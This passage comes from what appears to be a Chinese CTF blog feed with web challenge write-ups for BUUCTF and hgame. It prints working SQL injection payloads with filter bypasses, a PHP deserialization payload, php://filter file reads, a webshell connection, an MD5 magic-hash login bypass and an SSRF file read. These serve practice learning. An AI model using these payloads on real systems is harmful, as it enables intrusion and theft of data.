<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战 2019LoveSQL</title>
    <url>/2020/02/06/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019LoveSQL/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="极客大挑战 2019 LoveSQL"></a>极客大挑战 2019 LoveSQL</h1><p>打开题目  先用万能密码登录试试</p>
<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/0.png" alt="avatar"></p>
<p>用order by试试字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://3a2fed05-d0ad-42fe-9dbd-898c38712309.node3.buuoj.cn/check.php?username=1%27%20order%20by%204%20%23&amp;password=123</span><br></pre></td></tr></table></figure>
<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/1.png" alt="avatar"></p>
<p>得知有3个字段  接下来就是常规的注入了</p>
<p>爆表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://3a2fed05-d0ad-42fe-9dbd-898c38712309.node3.buuoj.cn/check.php?username=1%27%20union%20select%201%2C2%2Cgroup_concat%28table_name%29%20from%20information_schema.tables%20where%20table_schema%3D%20database%28%29%20%23&amp;password=123</span><br></pre></td></tr></table></figure>
<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/2.png" alt="avatar"></p>
<p>查一下表 l0ve1ysq1</p>
<p>爆字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://3a2fed05-d0ad-42fe-9dbd-898c38712309.node3.buuoj.cn/check.php?username=1%27%20union%20select%201%2C2%2Cgroup_concat%28column_name%29%20from%20information_schema.columns%20where%20table_name%3D%20%27l0ve1ysq1%27%20%23&amp;password=123</span><br></pre></td></tr></table></figure>
<p>得到三个字段 查一下password</p>
<p>爆数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://3a2fed05-d0ad-42fe-9dbd-898c38712309.node3.buuoj.cn/check.php?username=1%27%20union%20select%201%2C2%2Cgroup_concat%28password%29%20from%20l0ve1ysq1%20%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战 2019 Knife</title>
    <url>/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="极客大挑战 2019 Knife"></a>极客大挑战 2019 Knife</h1><p>根据提示<br>我家菜刀丢了，你能帮我找一下么</p>
<p>eval($_POST[“Syc”]);</p>
<p>真·白给题目<br>url:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://6f72969b-3f14-4fb0-bcaa-a5ce479c4a73.node3.buuoj.cn/?Knife.php</span><br></pre></td></tr></table></figure>
<p>密码：Syc</p>
<p>菜刀连接 根目录下有flag文件 </p>
<p>访问得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战2019 PHP</title>
    <url>/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="极客大挑战 2019 PHP"></a>极客大挑战 2019 PHP</h1><p>打开题目 得到提示备份了网站<br>所以考虑</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php.bak   失败</span><br><span class="line">www.tar  失败</span><br><span class="line">www.zip  成功</span><br></pre></td></tr></table></figure>
<p>下载到源码后 先查看一下index.php<br>得知用了反序列化的函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">  &lt;title&gt;I have a cat!&lt;/title&gt;</span><br><span class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;</span><br><span class="line">      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">    #login&#123;   </span><br><span class="line">        position: absolute;   </span><br><span class="line">        top: 50%;   </span><br><span class="line">        left:50%;   </span><br><span class="line">        margin: -150px 0 0 -150px;   </span><br><span class="line">        width: 300px;   </span><br><span class="line">        height: 300px;   </span><br><span class="line">    &#125;   </span><br><span class="line">    h4&#123;   </span><br><span class="line">        font-size: 2em;   </span><br><span class="line">        margin: 0.67em 0;   </span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;world&quot;&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    include &apos;class.php&apos;;</span><br><span class="line">    $select = $_GET[&apos;select&apos;];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script src=&apos;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&apos;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&apos;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&apos;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&apos;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script  src=&quot;index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>接下来根据包含 查看class.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &apos;nonono&apos;;</span><br><span class="line">    private $password = &apos;yesyes&apos;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username = &apos;guest&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password != 100) &#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username === &apos;admin&apos;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&apos;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>根据_destruct（）函数  得知this-&gt;password==100  this-&gt;username==admin时  输出flag</p>
<p>随意在后面添加上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a = new Name(&apos;admin&apos;,100);</span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure>
<p>启动本地PHP环境  访问一下新的class.php<br>得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;Syc&#123;dog_dog_dog_dog&#125;</span><br></pre></td></tr></table></figure>

<p>这里不会了 看了一下WP<br>知识点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失，所以加上加%00</span><br><span class="line"></span><br><span class="line">将Name后面的2改为3 是为了绕过__wakeup()  使其username不被覆盖</span><br></pre></td></tr></table></figure>

<p>最后的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p>学完JAVA之后 总算对反序列化这玩意 有点概念了  题不算太难 但是挺有意思的  开始我的反序列化之旅</p>
<p>看了WP之后 得知还有用python提交的  更简便  等以后我会更新一下python脚本的方法</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战 2019 Secret</title>
    <url>/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-Secret"><a href="#极客大挑战-2019-Secret" class="headerlink" title="极客大挑战 2019 Secret"></a>极客大挑战 2019 Secret</h1><p>打开题目 发现小㊙  查看一下源码 得到文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Archive_room.php</span><br></pre></td></tr></table></figure>
<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/0.png" alt="avatar"><br>点击SECRET</p>
<p><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/1.png" alt="avatar"><br>看来要用BP抓包了</p>
<p>通过抓包确实得到一个action.php的文件<br><img src="/images/BUUCTF/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Secret/2.png" alt="avatar"></p>
<p>放到Reapter中 发包  得到文件secr3t.php </p>
<p>访问得到源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&apos;file&apos;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>审计之后 构造payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secr3t.php?file=flag.php</span><br></pre></td></tr></table></figure>
<p>发现不太行</p>
<p>使用伪协议读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>得到base64  解码得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-RoarCTF2019 Easy Java</title>
    <url>/2020/02/03/BUUCTF-RoarCTF2019-Easy-Java/</url>
    <content><![CDATA[<h1 id="RoarCTF2019-Easy-Java"><a href="#RoarCTF2019-Easy-Java" class="headerlink" title="RoarCTF2019 Easy Java"></a>RoarCTF2019 Easy Java</h1><p>打开环境  根据题目提示是JAVA 点击help<br>得到java.io.FileNotFoundException:{help.docx}</p>
<p>还没做过这种题  看了一下WP</p>
<p>知识点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WEB-INF/web.xml泄露</span><br><span class="line"></span><br><span class="line">WEB-INF主要包含一下文件或目录:</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line"></span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line"></span><br><span class="line">/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line"></span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line"></span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line"></span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</span><br></pre></td></tr></table></figure>
<p>用BP抓包  改为POST请求  得到报错<br><img src="/images/BUUCTF/EasyJava/0.png" alt="avatar"></p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filename=WEB-INF/web.xml</span><br></pre></td></tr></table></figure>
<p><img src="/images/BUUCTF/EasyJava/1.png" alt="avatar"></p>
<p>读取FlagController.class</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?filename=WEB-INF/classes/com/wm/ctf/FlagController.class</span><br></pre></td></tr></table></figure>
<p><img src="/images/BUUCTF/EasyJava/2.png" alt="avatar"></p>
<p>得到base64  解码得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战 2019EasySQL 1</title>
    <url>/2020/02/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL-1/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="极客大挑战 2019 EasySQL"></a>极客大挑战 2019 EasySQL</h1><p>打开题目之后 发现就是一个索然无味的登陆界面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入   密码随意</span><br><span class="line">1  回显</span><br><span class="line">1&apos; 出现报错信息 得知是用单引号保护变量</span><br><span class="line">由于后面还接着password  所以不能使用#等注释符  不然就不会成立</span><br></pre></td></tr></table></figure>

<p>所以直接使用万能密码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&apos;or&apos;1&apos;=&apos;1&amp;password=admin&apos;or&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p>很基础的题  极客大挑战虽然没参加  但是感觉难度应该不是很高  强网杯自闭</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-Havefun</title>
    <url>/2020/02/01/BUUCTF-Havefun/</url>
    <content><![CDATA[<h1 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h1><p>这道题做出来的时候 让我一度认为作者是在搞我</p>
<p>查看源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cat=$_GET[&apos;cat&apos;];</span><br><span class="line">        echo $cat;</span><br><span class="line">        if($cat==&apos;dog&apos;)&#123;</span><br><span class="line">            echo &apos;Syc&#123;cat_cat_cat_cat&#125;&apos;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p> payload:<br> /?cat=dog</p>
<p> 得到flag</p>
<p> 八成是个签到题目</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-Cosmos的留言板-1</title>
    <url>/2020/01/27/hgame-Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/</url>
    <content><![CDATA[<h1 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h1><p>打开环境 基本就可以知道是考SQL注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line">1&apos; 没有回显，可以知道使用单引号保护变量</span><br><span class="line">1&apos;#  没有回显</span><br><span class="line">1# 有回显 可以用来查看一下过滤情况</span><br><span class="line">1/**/union/**/select#  得知select被过滤了</span><br><span class="line">1/**/union/**/select/**/table_schema/**/table_name/**/column/**/information_schema#  得知常规的SQL注入都没有被过滤</span><br></pre></td></tr></table></figure>
<p>最后得知过滤掉了select和空格</p>
<p>这里有很多个方法 用/**/块注释代替空格<br>select的话可以用sel&lt;&gt;ect进行截断<br>或者大小写混写 SelecT</p>
<p>再构造payload:</p>
<pre><code>-1&apos;/**/or/**/&apos;1&apos;=&apos;1  回显正常</code></pre><p>爆表：</p>
<pre><code>-1&apos;/**/union/**/SelecT/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/having&apos;1&apos;=&apos;1
得到表名 f1aggggggggggggg</code></pre><p>爆字段：</p>
<pre><code>-1&apos;/**/union/**/SelecT/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&apos;f1aggggggggggggg&apos;/**/having&apos;1&apos;=&apos;1
得到字段名fl4444444g</code></pre><p>查询：</p>
<pre><code>-1&apos;/**/union/**/SelecT/**/fl4444444g/**/from/**/f1aggggggggggggg/**/having&apos;1&apos;=&apos;1</code></pre><p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-cosmos的博客后台</title>
    <url>/2020/01/26/hgame-cosmos%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%90%8E%E5%8F%B0/</url>
    <content><![CDATA[<h1 id="cosmos的博客后台"><a href="#cosmos的博客后台" class="headerlink" title="cosmos的博客后台"></a>cosmos的博客后台</h1><p>太艰难了 自己还是太菜了<br>首先打开环境 hint是flag在根目录下<br>所以尝试一下本地文件包含  但是发现Hacker get out!</p>
<p>再尝试一下用伪协议去读login.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://cosmos-admin.hgame.day-day.work/index.php?action=php://filter/read=convert.base64-encode/resource=login.php</span><br></pre></td></tr></table></figure>
<p>再用base64转义一下  得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Only for debug</span></span><br><span class="line"><span class="keyword">if</span> (DEBUG_MODE)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) &#123;</span><br><span class="line">        $debug = $_GET[<span class="string">'debug'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($admin_password == md5($_POST[<span class="string">'password'</span>]) &amp;&amp; $_POST[<span class="string">'username'</span>] === $admin_username)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $_POST[<span class="string">'username'</span>];</span><br><span class="line">            header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"用户名或密码错误"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"zh-CN"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"description"</span> content=<span class="string">""</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"author"</span> content=<span class="string">""</span>&gt;</span><br><span class="line">    &lt;title&gt;Cosmos的博客后台&lt;/title&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/signin.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/sticky-footer.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="container"&gt;</span><br><span class="line">    &lt;form class="form-signin" method="post" action="login.php"&gt;</span><br><span class="line">        &lt;h2 class="form-signin-heading"&gt;后台登陆&lt;/h2&gt;</span><br><span class="line">        &lt;input type="text" name="username" class="form-control" placeholder="用户名" required autofocus&gt;</span><br><span class="line">        &lt;input type="password" name="password" class="form-control" placeholder="密码" required&gt;</span><br><span class="line">        &lt;input class="btn btn-lg btn-primary btn-block" type="submit" value="Submit"&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;footer class="footer"&gt;</span><br><span class="line">	&lt;center&gt;</span><br><span class="line">	&lt;div class="container"&gt;</span><br><span class="line">        &lt;p class="text-muted"&gt;Created by Annevi&lt;/p&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;/center&gt;</span><br><span class="line">&lt;/footer&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Only for debug</span></span><br><span class="line"><span class="keyword">if</span> (DEBUG_MODE)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) &#123;</span><br><span class="line">        $debug = $_GET[<span class="string">'debug'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://cosmos-admin.hgame.day-day.work/login.php?debug=GLOBALS</span><br></pre></td></tr></table></figure>
<p>使用GLOBALS显示全局变量<br>得到账号：Cosmos!<br>密码由于采用了!== 又是md5 而且是0exxxxx格式  所以利用PHP中md5的漏洞<br><a href="https://blog.csdn.net/qq_19980431/article/details/83018232" target="_blank" rel="noopener">https://blog.csdn.net/qq_19980431/article/details/83018232</a></p>
<p>随便用一个：QNKCDZO<br>成功登录到后台之后</p>
<p>再利用伪协议读取一下admin.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_img</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'img_url'</span>])) &#123;</span><br><span class="line">        $img_url = @$_POST[<span class="string">'img_url'</span>];</span><br><span class="line">        $url_array = parse_url($img_url);</span><br><span class="line">        <span class="keyword">if</span> (@$url_array[<span class="string">'host'</span>] !== <span class="string">"localhost"</span> &amp;&amp; $url_array[<span class="string">'host'</span>] !== <span class="string">"timgsa.baidu.com"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">        $c = curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $res = curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar = base64_encode($res);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> base64_encode(file_get_contents(<span class="string">"static/logo.png"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键代码 利用SSRF构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file://localhost/flag</span><br></pre></td></tr></table></figure>
<p>复制图片的地址 解码后面的base64</p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-鸡尼泰玫</title>
    <url>/2020/01/26/hgame-%E9%B8%A1%E5%B0%BC%E6%B3%B0%E7%8E%AB/</url>
    <content><![CDATA[<h1 id="鸡尼泰玫"><a href="#鸡尼泰玫" class="headerlink" title="鸡尼泰玫"></a>鸡尼泰玫</h1><p>打开发现又黑我坤坤</p>
<p>发现是个游戏 开始游戏 随便玩玩用bp抓包<br><img src="/images/hgame/%E9%B8%A1%E4%BD%A0%E5%A4%AA%E7%BE%8E/0.png" alt="avatar"></p>
<p>直接改score</p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-Code World</title>
